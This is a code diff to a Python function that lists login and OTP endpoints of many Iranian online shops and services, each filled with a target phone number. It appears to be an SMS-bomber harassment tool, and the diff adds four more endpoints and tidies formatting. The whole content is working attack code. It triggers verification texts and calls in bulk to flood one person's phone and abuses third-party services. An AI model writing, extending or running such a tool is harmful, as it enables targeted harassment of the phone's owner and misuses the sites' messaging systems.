@@ -5,7 +5,7 @@ def send_otp_requests(number):
         'ketabweb': ('https://ketabweb.com/login/?usernameCheck=1', {'username': '0' + number}),
         'dastaneman': ('https://dastaneman.com/User/SendCode', {'mobile': '0098' + number}),
         'noavarpub': ('https://noavarpub.com/logins/login.php?ref=https%3A%2F%2Fnoavarpub.com%2F', {'phone': '0' + number,'submit':'123'}),
-        'hovalvakil': ('https://api.hovalvakil.com/api/User/SendConfirmCode?userName='+number+'', None),
+        'hovalvakil': ('https://api.hovalvakil.com/api/User/SendConfirmCode?userName='+ number +'', None),
         'azarbadbook': ('https://azarbadbook.ir/ajax/login_j_ajax_ver/', {'phone': number}),
         'kanoonbook': ('https://www.kanoonbook.ir/store/customer_otp', {'customer_username': number,'task':'customer_phone'}),
         'cheshmandazketab': ('https://www.cheshmandazketab.ir/Register', {'phone': '0' + number,'login':'1'}),
@@ -68,35 +68,35 @@ def send_otp_requests(number):
             'otp_call': 'true'
         }),
         'okala': ('https://api-react.okala.com/C/CustomerAccount/OTPRegister', {
-            'mobile': '0'+number,
+            'mobile': '0' + number,
             'deviceTypeCode' :0,
             'confirmTerms': 'true',
             'notRobot': 'false',
         }),
         'digikala': ('https://api.digikala.com/v1/user/authenticate/', {
             'backUrl': '/',
-            'username': '0'+number,
+            'username': '0' + number,
             'otp_call': 'false'
         }),
         'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php', {
             'action': 'stm_login_register',
             'type': 'mobile',
-            'input': '0'+number
+            'input': '0' + number
         }),
         'mellishoes': ('https://mellishoes.ir/wp-admin/admin-ajax.php', {
             'action': 'websima_auth_account_detection',
             'account_detection_nonce_field': '21737b7e2d',
-            'mobile': '0'+number,
+            'mobile': '0' + number,
             '_wp_http_referer':'/'
         }),
         'setshoe': ('https://setshoe.ir/wp-admin/admin-ajax.php', {
             'action': 'stm_login_register',
             'type': 'mobile',
-            'input': '0'+number,
+            'input': '0' + number,
         }),
         'maxbax': ('https://maxbax.com/wp-admin/admin-ajax.php', {
             'action': 'bakala_send_code',
-            'phone_email': '0'+number,
+            'phone_email': '0' + number,
         }),
         'shikstyle': ('https://shik.style/wp-admin/admin-ajax.php', {
             'action': 'login',
@@ -129,12 +129,24 @@ def send_otp_requests(number):
             'password': '123456',
             'mobile': number,
         }),
-        'mahouney': (' https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber', {
+        'mahouney': ('https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber', {
             'ReturnUrl': 'https://mahouney.com/',
             'MobaileNumber': '0' + number,
         }),
-       
-        
+       'queenaccessories': ('https://queenaccessories.ir/api/v1/sessions/login_request', {
+            '{"mobile_phone"': '"0'+ number +'"}',
+        }),
+       'rastaraccessory': ('https://rastaraccessory.ir/api/v1/sessions/login_request', {
+            '{"mobile_phone"': '"0'+ number +'"}',
+        }), 
+        'vinaaccessory': ('https://vinaaccessory.com/api/v1/sessions/login_request', {
+            '{"mobile_phone"': '"0'+ number +'"}',
+        }), 
+        'myroz': ('https://myroz.ir/wp-admin/admin-ajax.php', {
+            'action': 'stm_login_register',
+            'type': 'mobile',
+            'input': '0' + number,
+        }),        
     }
 
     return list(url_payload_map.values())
